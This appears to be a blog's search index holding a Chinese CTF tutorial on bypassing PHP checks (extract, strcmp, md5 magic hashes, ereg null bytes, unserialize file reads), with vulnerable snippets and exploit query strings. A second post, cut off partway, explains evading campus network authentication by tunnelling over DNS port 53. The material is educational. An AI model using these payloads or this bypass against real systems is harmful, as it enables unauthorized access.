<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>php常见函数绕过</title>
      <link href="/posts/undefined.html"/>
      <url>/posts/undefined.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="extract"><a href="#extract" class="headerlink" title="extract()"></a><a href="http://php.net/manual/zh/function.extract.php" target="_blank" rel="noopener">extract()</a></h1><p>extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖<br>kugku例题：<br> <a href="http://120.24.86.145:9009/1.php" target="_blank" rel="noopener">http://120.24.86.145:9009/1.php</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'xxx'</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$shiyan</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>解题：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?shiyan=&amp;flag=</span><br></pre></td></tr></table></figure></p><h1 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a><a href="http://www.php.net/manual/zh/function.strcmp.php" target="_blank" rel="noopener">strcmp()</a></h1><p>5.2 中是将两个参数先转换成string类型。<br>5.3.3以后，当比较数组和字符串的时候，返回是0。<br>5.5 中如果参数不是string类型，直接return了  </p><p>bugku例题:<a href="http://120.24.86.145:9009/6.php" target="_blank" rel="noopener">http://120.24.86.145:9009/6.php</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>解法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a[]=</span><br></pre></td></tr></table></figure><h1 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h1><p>1)PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>2)md5()不能处理数组。</p><p>bugku例题:<a href="http://120.24.86.145:9009/18.php" target="_blank" rel="noopener">http://120.24.86.145:9009/18.php</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'username'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'username'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>因为这里是”===”,所以只能用数组绕过<br>解法:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username[]=&amp;password[]=1</span><br></pre></td></tr></table></figure><h1 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a><a href="http://www.php.net/manual/zh/function.ereg.php" target="_blank" rel="noopener">ereg()</a></h1><p>bugku例题：<a href="http://120.24.86.145:9009/19.php" target="_blank" rel="noopener">http://120.24.86.145:9009/19.php</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'--'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>字符串对比解析<br>在这里如果 $_GET[‘password’]为数组，则返回值为NULL<br>如果为123%00–，则返回值为true<br>其余为false</p><p>解法一：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?password=123%00--</span><br></pre></td></tr></table></figure><p>解法二：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?password[]=</span><br></pre></td></tr></table></figure></p><h1 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h1><p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> is_numeric(233333);       <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> is_numeric(<span class="string">'233333'</span>);    <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> is_numeric(0x233333);    <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> is_numeric(<span class="string">'0x233333'</span>);   <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">echo</span> is_numeric(<span class="string">'233333abc'</span>);  <span class="comment"># 0</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>bugku例题：<a href="http://120.24.86.145:9009/22.php" target="_blank" rel="noopener">http://120.24.86.145:9009/22.php</a>  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure><p>解法一 ：<br>%00截断<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password=1337%00</span><br></pre></td></tr></table></figure></p><p>解法二：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password=1337qwe</span><br></pre></td></tr></table></figure></p><h1 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h1><p>md5 和 sha1 无法处理数组，返回 NULL  </p><p>bukug例题：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[&apos;name&apos;]);</span><br><span class="line">echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">var_dump($_GET[&apos;password&apos;]);</span><br><span class="line">var_dump(sha1($_GET[&apos;name&apos;]));</span><br><span class="line">var_dump(sha1($_GET[&apos;password&apos;]));</span><br><span class="line">if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">Your password can not be your name!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Invalid password.</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Login first!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>解题：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name[]=&amp;password[]=12</span><br></pre></td></tr></table></figure></p><h1 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a><a href="http://php.net/manual/zh/function.strpos.php" target="_blank" rel="noopener">strpos()</a></h1><p>数组绕过 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'ctf'</span>]) === FALSE)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>解题：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ctf[]=</span><br></pre></td></tr></table></figure><h1 id="变量本身的key"><a href="#变量本身的key" class="headerlink" title="变量本身的key"></a>变量本身的key</h1><p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //key.php?aaaa<span class="string">'aaa=1&amp;bb'</span>b=2 </span><br><span class="line"></span><br><span class="line">    //print_R(<span class="variable">$_GET</span>); </span><br><span class="line"></span><br><span class="line">     foreach (<span class="variable">$_GET</span> AS <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> <span class="variable">$key</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><h1 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a><a href="http://php.net/manual/zh/function.preg-match.php" target="_blank" rel="noopener">preg_match()</a></h1><p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">'1.1.1.1 abcd'</span>; // 可以绕过</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>,<span class="variable">$ip</span>)) &#123;</span><br><span class="line">  die(<span class="string">'error'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span>(<span class="string">'key...'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h1><p>== 是弱类型的比较，以下比较都为 true</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="built_in">echo</span> 0 == <span class="string">'a'</span> ;// a 转换为数字为 0    重点注意</span><br><span class="line"></span><br><span class="line">// 0x 开头会被当成16进制54975581388的16进制为 0xccccccccc</span><br><span class="line">// 十六进制与整数，被转换为同一进制比较</span><br><span class="line"><span class="string">'0xccccccccc'</span> == <span class="string">'54975581388'</span> ;</span><br><span class="line">// 字符串在与数字比较前会自动转换为数字，如果不能转换为数字会变成0</span><br><span class="line">1 == <span class="string">'1'</span>;</span><br><span class="line">1 == <span class="string">'01'</span>;</span><br><span class="line">10 == <span class="string">'1e1'</span>;</span><br><span class="line"><span class="string">'100'</span> == <span class="string">'1e2'</span> ;    </span><br><span class="line"></span><br><span class="line">// 十六进制数与带空格十六进制数，被转换为十六进制整数</span><br><span class="line"><span class="string">'0xABCdef'</span>  == <span class="string">'     0xABCdef'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'0010e2'</span> == <span class="string">'1e3'</span>;</span><br><span class="line">// 0e 开头会被当成数字，又是等于 0*10^xxx=0</span><br><span class="line">// 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过</span><br><span class="line"><span class="string">'0e509367213418206700842008763514'</span> == <span class="string">'0e481036490867661113260034900752'</span>;</span><br><span class="line"><span class="string">'0e481036490867661113260034900752'</span> == <span class="string">'0'</span> ;</span><br><span class="line"></span><br><span class="line">var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</span><br><span class="line">var_dump(md5(<span class="string">'aabg7XSs'</span>) == md5(<span class="string">'aabC9RqS'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaroZmOk'</span>) == sha1(<span class="string">'aaK1STfY'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaO8zKZF'</span>) == sha1(<span class="string">'aa3OFF9m'</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h1><p>与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//var.php?var=new  </span><br><span class="line"><span class="variable">$var</span>=<span class="string">'init'</span>;  </span><br><span class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>]);  </span><br><span class="line"><span class="built_in">print</span> <span class="variable">$var</span>;</span><br></pre></td></tr></table></figure><h1 id="unset"><a href="#unset" class="headerlink" title="unset()"></a>unset()</h1><p>unset(bar);用来销毁指定的变量，如果变量bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过   </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">// http://127.0.0.1/index.php?_CONFIG=123</span><br><span class="line"><span class="variable">$_CONFIG</span>[<span class="string">'extraSecure'</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">foreach(array(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) as <span class="variable">$method</span>) &#123;</span><br><span class="line">    foreach($<span class="variable">$method</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">      // <span class="variable">$key</span> == _CONFIG</span><br><span class="line">      // $<span class="variable">$key</span> == <span class="variable">$_CONFIG</span></span><br><span class="line">      // 这个函数会把 <span class="variable">$_CONFIG</span> 变量销毁</span><br><span class="line">      <span class="built_in">unset</span>($<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_CONFIG</span>[<span class="string">'extraSecure'</span>] == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'flag &#123;****&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h1><p>说明intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a = &apos;10000 union select * from yz&apos;;</span><br><span class="line">if(intval($a)&gt;1000)   </span><br><span class="line">    echo $a ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h1 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h1><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i =&quot;2abc&quot;;  </span><br><span class="line">switch ($i) &#123;  </span><br><span class="line">case 0:  </span><br><span class="line">case 1:  </span><br><span class="line">case 2:  </span><br><span class="line">echo &quot;i is less than 3 but not negative&quot;;  </span><br><span class="line">break;  </span><br><span class="line">case 3:  </span><br><span class="line">echo &quot;i is 3&quot;;  </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h1 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h1><p>下面的情况返回的都是true,因为’abc’会转换为0，’1bc’转换为1。<br>在所有php认为是int的地方输入string，都会被强制转换</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$array=[0,1,2,&apos;3&apos;];  </span><br><span class="line">var_dump(in_array(&apos;abc&apos;, $array)); //true  </span><br><span class="line">var_dump(in_array(&apos;1bc&apos;, $array)); //true</span><br></pre></td></tr></table></figure><h1 id="serialize-和-unserialize漏洞"><a href="#serialize-和-unserialize漏洞" class="headerlink" title="serialize 和 unserialize漏洞"></a>serialize 和 unserialize漏洞</h1><p>这里我们先简单介绍一下php中的魔术方法（这里如果对于类、对象、方法不熟的先去学学吧），即Magic方法，php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<strong>开头的，比如 </strong>construct， <strong>destruct，</strong>toString，<strong>sleep，</strong>wakeup等等。这些函数都会在某些特殊时候被自动调用。<br>例如<strong>construct()方法会在一个对象被创建时自动调用，对应的</strong>destruct则会在一个对象被销毁时调用等等。<br>这里有两个比较特别的Magic方法，<strong>sleep 方法会在一个对象被序列化的时候调用。 </strong>wakeup方法会在一个对象被反序列化的时候调用。</p><p>在这里介绍一个序列化漏洞，首先不要相信用户输入的一切<br>看下面代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    public $username = &apos;&apos;;</span><br><span class="line">    public $password = &apos;&apos;;</span><br><span class="line">    public $file = &apos;&apos;;</span><br><span class="line">    public function out()&#123;</span><br><span class="line">        echo &quot;username: &quot;.$this-&gt;username.&quot;&lt;br&gt;&quot;.&quot;password: &quot;.$this-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     public function __toString() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">$a-&gt;file = &apos;C:\Users\YZ\Desktop\plan.txt&apos;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">//tostring方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了</span><br></pre></td></tr></table></figure></p><p>下面就可以读取了C:\Users\YZ\Desktop\plan.txt文件了<br>echo unserialize触发了__tostring函数  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    public $username = &apos;&apos;;</span><br><span class="line">    public $password = &apos;&apos;;</span><br><span class="line">    public $file = &apos;&apos;;</span><br><span class="line">    public function out()&#123;</span><br><span class="line">        echo &quot;username: &quot;.$this-&gt;username.&quot;&lt;br&gt;&quot;.&quot;password: &quot;.$this-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     public function __toString() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = &apos;O:4:&quot;test&quot;:3:&#123;s:8:&quot;username&quot;;s:0:&quot;&quot;;s:8:&quot;password&quot;;s:0:&quot;&quot;;s:4:&quot;file&quot;;s:28:&quot;C:\Users\YZ\Desktop\plan.txt&quot;;&#125;&apos;;</span><br><span class="line">echo unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="session-反序列化漏洞"><a href="#session-反序列化漏洞" class="headerlink" title="session 反序列化漏洞"></a>session 反序列化漏洞</h1><p> 大佬的文章写得挺详细的: <a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p><p> 参考文章：  </p><p> <a href="https://blog.csdn.net/qq_31481187/article/details/60968595/" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/60968595/</a></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过校园网认证，实现校园防断网</title>
      <link href="/posts/390158a6.html"/>
      <url>/posts/390158a6.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我的学校晚上十一点后就断网了，对于我这没有办理手机无限流量套餐的，看着可怜少之又少的流量套餐，断网后，就是一件悲催的事情，不能追剧，不能看动漫，不能刷漫画,很是无奈。最近，听说有位学弟实现了校园防断网，立马请教，学弟发了几片文章让我参考去实现，搞了一两天，感觉我真的手挺拙的，只能时不时地麻烦学弟,折腾了好几种防断网的方式，最后感觉搭建SoftEther实现防断网的方式比较稳。<br><a id="more"></a></p><h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>校园网的web认证，我们电脑连接这个wifi或者插上网线实现认证之前，电脑就已经被分配到了一个ip地址，当我们想要上网的时候，网关会修改我们的http数据包，让我们重定向到一个提示要打开网络认证或直接到网络认证的页面。如果没有认证成功，无法得知网关的arp信息，也就无法发送跨网段的tcp连接和http请求，当然无法上网。但是，开启web认证交换机设备默认是放行DHCP和DNS报文,也是就udp53和udp67。当然，这就是我们实现防断网要利用的重点。如果没有对udp53和udp67发送的任何数据包进行拦截，我们可以利用udp53和udp67发送任何形式的数据包，实现不用锐捷认证，就可以上网。<br>这里有篇web认证的详细说明<br><a href="http://www.ruijie.com.cn/fw/wt/36502" target="_blank" rel="noopener">http://www.ruijie.com.cn/fw/wt/36502</a></p><h1 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h1><p>电脑先连上wifi或者插上网线，不要认证。<br>打开cmd命令行，输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup wwww.baidu.com</span><br></pre></td></tr></table></figure></p><p><img src="/posts/../../images/vpn/1.png" alt=""><br>在没有认证校园网的情况下，可以查到ip地址，可以判定没有过滤dns报文<br>接下来，我们看一下没有放行udp53的所有数据包<br>先到该githb上下载一下测试工具  <a href="https://github.com/BennyThink/UDP53-Filter-Type" target="_blank" rel="noopener">https://github.com/BennyThink/UDP53-Filter-Type</a><br>linux用户 运行 <code>python UDP53.py</code><br>window下的用户运行dist下的UDP53.exe<br><img src="/posts/../../images/vpn/2.png" alt=""><br>出现 <code>Congratulations, you may wanna try OpenVPN!</code> 就知道dup53的任何数据包都被放行了。<br>现在我们可以继续下一步了。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>准备一台vps<br>不建议买国内的云服务器来搭建，因为很多都是限制宽带的，搭建起来网速会很卡。<br>国外的vps比较好用的就vultr和搬瓦工的，vultr的性价比较高，个人建议买vultr的vps。<br>vutlr的官网：<a href="https://www.vultr.com/" target="_blank" rel="noopener">https://www.vultr.com/</a><br>softether的客户端和服务端相关软件可以在下面的链接下载，不过要翻墙。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.softether-download.com/cn.aspx?product=softether</span><br></pre></td></tr></table></figure></p><p>不能翻墙的，这里提供一个百度云盘地址下载<br>链接：<a href="https://pan.baidu.com/s/1OgpdL9Wg3naGNTUeQpDoAQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1OgpdL9Wg3naGNTUeQpDoAQ</a> 密码：ylgn</p><h1 id="softether-服务端的搭建"><a href="#softether-服务端的搭建" class="headerlink" title="softether 服务端的搭建"></a>softether 服务端的搭建</h1><p>vps的系统环境我选择linux系统ubuntu。<br> 32位：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget 